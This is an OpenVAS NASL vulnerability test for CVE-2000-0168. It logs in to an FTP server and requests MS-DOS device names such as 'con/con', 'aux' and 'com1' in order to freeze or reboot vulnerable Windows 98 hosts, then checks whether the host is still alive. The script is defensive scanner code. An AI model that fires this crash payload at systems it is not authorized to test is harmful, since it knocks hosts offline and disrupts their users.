# OpenVAS Vulnerability Test
# $Id: ftp_w98_devname_dos.nasl 13610 2019-02-12 15:17:00Z cfischer $
# Description: FTP Windows 98 MS/DOS device names DOS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added links to the Bugtraq message archive and Microsoft Knowledgebase
#
# Copyright:
# Copyright (C) 2001 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

# This script is a copy of http_w98_devname_dos.nasl.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10929");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(1043);
  script_cve_id("CVE-2000-0168");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("FTP Windows 98 MS/DOS device names DOS");
  script_category(ACT_KILL_HOST);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2001 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://support.microsoft.com/default.aspx?scid=KB;en-us;Q256015");
  script_xref(name:"URL", value:"http://online.securityfocus.com/archive/1/195054");

  script_tag(name:"solution", value:"Upgrade your system or use a
  FTP server that filters those names out.");

  script_tag(name:"summary", value:"It was possible to freeze or reboot Windows by
  reading a MS/DOS device through FTP, using a file name like CON\CON, AUX.htm or AUX.");

  script_tag(name:"impact", value:"A attacker may use this flaw to make your
  system crash continuously, preventing you from working properly.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];
if (! login) exit(0);

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

ext[0] = ".foo";
ext[1] = ".";
ext[2] = ". . .. ... .. .";
ext[3] = "-";

port = get_ftp_port(default:21);

soc = open_sock_tcp(port);
if (! soc) exit(0);
r = ftp_recv_line(socket: soc);
ftp_close(socket: soc);
if (! r)
{
  exit(0);
}

 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "-")
    name = string(d, "/", d);
   else
    name = string(d, e);
   soc = open_sock_tcp(port);
   if(soc)
   {
    if (ftp_authenticate(socket:soc, user:login, pass:pass))
    {
     port2 = ftp_pasv(socket:soc);
     soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
     req = string("RETR ", name, "\r\n");
     send(socket:soc, data:req);
     if (soc2) close(soc2);
    }
    close(soc);
   }
  }
 }


alive = end_denial();
if(!alive)
{
 security_message(port);
 set_kb_item( name:"Host/dead", value:TRUE );
 exit(0);
}

r = NULL;
soc = open_sock_tcp(port);
if (soc)
{
  r = ftp_recv_line(socket: soc);
  ftp_close(socket: soc);
}

if (! r)
{
  security_message(port: port);
}
